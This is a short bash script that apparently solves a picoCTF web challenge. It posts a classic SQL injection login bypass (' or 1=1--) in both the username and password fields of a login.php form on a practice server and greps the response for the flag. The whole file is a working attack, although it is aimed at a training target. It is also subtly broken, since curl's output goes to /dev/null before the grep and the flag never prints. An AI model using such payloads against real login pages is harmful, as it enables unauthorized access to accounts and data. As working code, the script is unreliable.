#!/bin/bash

echo "A flag again...? Okay I'll get it for you..."
read -p "Port?: " port

curl -X POST "http://saturn.picoctf.net:${port}/login.php" -d "username=' or 1=1--" -d "password=' or 1=1--" > /dev/null 2>&1| grep -o "picoCTF{.*}"
